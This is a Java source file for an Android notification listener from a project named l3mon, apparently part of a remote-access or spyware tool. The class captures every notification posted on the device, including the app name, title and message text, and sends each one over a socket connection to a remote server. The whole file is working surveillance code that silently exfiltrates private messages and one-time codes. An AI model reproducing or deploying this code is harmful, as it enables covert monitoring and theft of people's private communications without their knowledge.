package com.etechd.l3mon;

import org.json.JSONException;
import org.json.JSONObject;

import android.app.Notification;
import android.os.Bundle;
import android.os.IBinder;

import android.content.Intent;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

public class NotificationListener extends NotificationListenerService {

    @Override
    public IBinder onBind(Intent intent) {
        return super.onBind(intent);
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn){
        try {
            String appName = sbn.getPackageName();
            String title = sbn.getNotification().extras.getString(Notification.EXTRA_TITLE);
            CharSequence contentCs = sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TEXT);
            String content = "";
            if(contentCs != null) content = contentCs.toString();
            long postTime = sbn.getPostTime();
            String uniqueKey = sbn.getKey();

            JSONObject data = new JSONObject();
            data.put("appName", appName);
            data.put("title", title);
            data.put("content", "" + content);
            data.put("postTime", postTime);
            data.put("key", uniqueKey);
            IOSocket.getInstance().getIoSocket().emit("0xNO" , data);
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }
}
